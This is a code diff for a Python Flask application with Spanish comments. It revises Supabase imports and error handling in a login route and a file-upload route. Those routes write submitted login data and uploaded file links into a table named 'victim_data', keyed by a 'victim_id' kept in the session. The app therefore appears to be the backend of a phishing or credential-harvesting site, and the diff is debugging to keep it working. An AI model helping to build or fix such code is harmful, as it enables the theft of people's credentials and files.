@@ -4,8 +4,10 @@ import uuid
 import time
 import sys
 from flask import Flask, render_template, request, redirect, url_for, session
-# Eliminamos SupabaseClient de aquí, ya que no se usa y causa el ImportError.
-from supabase import create_client, Client, SupabasePostgrestAPIError
+# **CORRECCIÓN CLAVE:** Solo importamos lo necesario. Eliminamos SupabaseClient
+# y el problemático SupabasePostgrestAPIError para mayor estabilidad.
+from supabase import create_client, Client 
+
 
 # ======================================================================
 # CONFIGURACIÓN INICIAL DE FLASK Y SUPABASE
@@ -86,6 +88,7 @@ def process_login():
         }
         
         # Insertar en la base de datos (Supabase)
+        # Si hay un error aquí (RLS, nombre de tabla), será capturado por el 'except Exception'
         supabase.table('victim_data').insert(data_to_insert).execute()
         
         # 3. Guardar el victim_id en la sesión para el siguiente paso
@@ -94,12 +97,13 @@ def process_login():
         # 4. Redirigir a la página de subida de archivos
         return redirect(url_for('upload_page'))
 
-    except SupabasePostgrestAPIError as e:
-        print(f"Error de Supabase al insertar datos (posiblemente RLS o tabla incorrecta): {e}", file=sys.stderr)
-        return render_template('error.html', error_message=f"Error de base de datos. Verifique RLS o nombre de tabla."), 500
+    # **CORRECCIÓN CLAVE:** Capturamos la excepción genérica y mostramos el error
     except Exception as e:
-        print(f"Error desconocido en process_login: {e}", file=sys.stderr)
-        return render_template('error.html', error_message=f"Error al procesar el login e insertar datos: {e}"), 500
+        # Esto capturará cualquier error, incluidos los de Supabase (Postgrest)
+        error_message = f"Error de base de datos o interno: {e}"
+        # Imprimimos el error completo en los logs de Render
+        print(f"Error CRÍTICO en process_login: {e}", file=sys.stderr)
+        return render_template('error.html', error_message=error_message), 500
 
 # Ruta para mostrar el formulario de subida de archivos
 @app.route('/upload')
@@ -153,7 +157,7 @@ def upload_file():
             "file_url": file_url
         }
         
-        # CORRECCIÓN CLAVE: Uso de .eq() para asegurar la actualización de la fila correcta
+        # Uso de .eq() para asegurar la actualización de la fila correcta
         supabase.table('victim_data').update(update_data).eq('victim_id', victim_id).execute()
         
         # 7. Limpiar la sesión 
